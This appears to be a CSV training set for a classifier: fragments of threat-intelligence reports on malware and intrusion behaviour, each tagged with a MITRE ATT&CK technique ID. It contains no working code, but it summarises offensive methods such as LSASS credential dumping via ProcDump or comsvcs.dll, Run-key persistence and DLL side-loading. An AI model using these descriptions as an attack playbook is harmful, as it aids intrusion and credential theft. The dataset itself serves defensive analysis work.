text,label
can be configured to use TCP ICMP and UDP for C2 communications.(Citation: Talos Cobalt Strike September 2020),T1095
"cyber actors used valid accounts to log into a service specifically designed to accept remote connections,",T1078
has discovered the OS version CPU model and RAM size of the system it has been installed on.,T1082
can collect information about the about the system.,T1082
It then calls CallWindowProcW API.,T1106
contains modules for searching for passwords in local and remote files.,T1552.001
Commands executed by WMI on new hosts,T1047
The  dropper can decrypt and decompresses a data blob.,T1140
use this technique to retrieve export functions from loaded libraries,T1106
can make small changes to itself in order to change its checksum and hash value.(Citation: Crowdstrike Qakbot October 2020),T1027
checks for the presence of Avast antivirus in the C:\Program\Files\ folder. ,T1518.001
has used HTTP for C2.,T1071.001
obtains the device’s local and external IP address.,T1016
The malicious document is delivered in either zip files or ISO images to the target through phishing emails.,T1566.001
deobfuscates its strings and APIs once its executed.,T1140
domain fronting,T1090
has used native APIs including GetModuleFileName lstrcat CreateFile and ReadFile.,T1106
has used spearphishing attachments to deliver initial access payloads.(Citation: Recorded Future REDDELTA July 2020)(Citation: Proofpoint TA416 November 2020),T1566.001
2 Downloads a file to the system,T1105
of a Security Package into LSASS using RPC calls.,T1003.001
has encrypted it's main payload using 3DES. ,T1027
creates a backdoor through which remote attackers can retrieve lists of running processes.,T1057
queried a number of target hosts to determine the host disk drive configuration,T1082
Some versions of  have used the hard-coded string this is the encrypt key for Blowfish encryption when communicating with a C2. Later versions have hard-coded keys uniquely for each C2 address.,T1573.001
cmd.exe /C,T1059.003
downloads a tar compressed archive from a download server to the system.,T1105
uses an RPC server that contains a file dropping routine and support for payload version updates for P2P communications within a victim network.,T1570
can identify the username on a compromised host.(Citation: Trend Micro DRBControl February 2020),T1033
collects the username from the victims machine.,T1033
has been known to stage files for exfiltration in a single location.,T1074.001
has collected the PID of a malicious process.,T1057
has the ability to collect information about installed AV products from an infected host.,T1518.001
DLL side-loading has been used to execute  through a legitimate Citrix executable ssonsvr.exe. The Citrix executable was dropped along with  by the dropper.,T1574.002
has added batch scripts to the startup folder.,T1547.001
the attacker's C2 via the HTTP POST method.,T1071.001
has the ability to collect recent files matching a hardcoded list of extensions prior to exfiltration.,T1005
has modified the Registry as part of its UAC bypass process. ,T1112
has the ability to identify the username on a compromised host.,T1033
can start a VNC-based remote desktop server and tunnel the connection through the already established C2 channel.(Citation: cobaltstrike manual),T1021.001
can launch cmd.exe to execute commands on the system.,T1059.003
During  the threat actors exploited multiple vulnerabilities in externally facing servers.,T1190
can register itself as a system service to gain persistence.,T1543.003
creates a scheduled task to ensure it is re-executed everyday.,T1053.005
the use of DLL sideloading for its arrival and execution technique.,T1574.002
the adversary had removed the payload file from the system.,T1027
can obtain information on installed anti-malware programs.,T1518.001
can download additional modules from the C2 server.,T1105
stores the gathered data from the machine in .db files and .bmp files under four separate locations.,T1074.001
the malware calls a decryption function,T1140
has used RDP to move laterally in victim environments.,T1021.001
can detect the victim's file or folder list.,T1083
can dump credentials.,T1003.001
During  the threat actors used the `tasklist` command as part of their advanced reconnaissance.,T1057
utilizing comsvcs.dll,T1003.001
used ipconfig to gather network configuration information.(Citation: Malwarebytes Higaisa 2020),T1016
can be used to discover processes running on a system.,T1057
can send the data it collects to the C2 server. ,T1041
has used  to get information on processes.,T1057
via reverse proxy.,T1090
has used built-in API functions such as WNetOpenEnumW() WNetEnumResourceW() WNetCloseEnum() GetProcAddress() and VirtualAlloc().(Citation: Mcafee Clop Aug 2019),T1106
can uninstall itself including deleting its executable.,T1070.004
These strings are passed to a decoding function where they are converted from hex to byte and XOR’d with decimal 18.,T1140
modified the Registry to create a Windows service for itself on a compromised host.,T1112
has established persistence by writing the payload to the Registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Run.,T1547.001
Place a value on RunOnce key,T1547.001
Note: DLL side loading is a prevalent persistence technique that is used to launch a multitude of backdoors,T1574.002
Decoder routine to decrypt the beacon DLL.,T1140
can use encrypted and encoded files for C2 configuration.(Citation: ClearSky Siamesekitten August 2021),T1027
used AES-128 to encrypt C2 traffic.,T1573.001
the threat actor managed to continue to access the victim’s cloud environment,T1078
ProcDump was used to dump LSASS memory.,T1003.001
Here’s a python code to decode,T1140
The  malware platform supports many standard protocols including HTTP and HTTPS.,T1071.001
"To remotely access the compromised infrastructure, the attackers may use Cobalt Strike, TeamViewer and ScreenConnect",T1219
ransomware uses obfuscation.,T1027
Persistence via Scheduled Task,T1053.005
has a command to delete a specified file.,T1070.004
has a command to download and execute an additional file.,T1105
can download remote files.,T1105
Thread Execution Hijacking,T1055
has the ability to identify the username and hostname on a compromised host.,T1033
During  PowerView's file share enumeration results were stored in the file `c:\ProgramData\found_shares.txt`.,T1074.001
A 2016 Novetta report detailed the work of security vendors attempting to unveil tools and infrastructure related to the 2014 destructive attack against Sony Pictures Entertainment,T1518.001
has deleted scripts after execution. ,T1070.004
can use HTTP in C2 communications.,T1071.001
The malware also established persistence on the host with the creation of a registry run key.,T1547.001
can use CMD to execute a process.,T1059.003
PowerShell Script uses Base64 and hexadecimal encoding and XOR-encryption,T1027
drops and executes Cobalt Strike in the memory space of “rundll32.exe.”,T1218.011
has modified files based on the open-source project cryptcat in an apparent attempt to decrease AV detection rates.,T1027
to push batch files over SMB to other systems within an internal network.,T1570
Restart Telnet brute forcing,T1110
launched an HTTP malware variant and a Port 22 malware variant using a legitimate executable that loaded the malicious DLL.,T1574.002
used brute-force attack to obtain login data.,T1110
can walk through directories and recursively search for strings in files.,T1083
a fake message to lure users to execute the HTA  file ,T1204.002
has intentionally deleted computer files to cover their tracks including with use of the program CCleaner.,T1070.004
